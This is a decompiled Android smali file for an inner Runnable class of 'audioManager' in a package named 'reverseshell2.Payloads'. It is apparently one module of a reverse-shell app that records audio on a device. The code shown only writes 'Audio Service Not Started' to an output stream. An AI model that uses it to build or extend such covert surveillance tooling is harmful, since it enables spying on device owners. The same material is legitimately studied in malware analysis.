.class Lcom/example/reverseshell2/Payloads/audioManager$4;
.super Ljava/lang/Object;
.source "audioManager.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/audioManager;->stopRecording(Ljava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/audioManager;

.field final synthetic val$outputStream:Ljava/io/OutputStream;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/audioManager;Ljava/io/OutputStream;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/audioManager;

    .line 134
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/audioManager$4;->this$0:Lcom/example/reverseshell2/Payloads/audioManager;

    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/audioManager$4;->val$outputStream:Ljava/io/OutputStream;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 138
    :try_start_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager$4;->val$outputStream:Ljava/io/OutputStream;

    const-string v1, "Audio Service Not Started\n"

    const-string v2, "UTF-8"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 141
    goto :goto_0

    .line 139
    :catch_0
    move-exception v0

    .line 140
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 142
    .end local v0    # "e":Ljava/io/IOException;
    :goto_0
    return-void
.end method
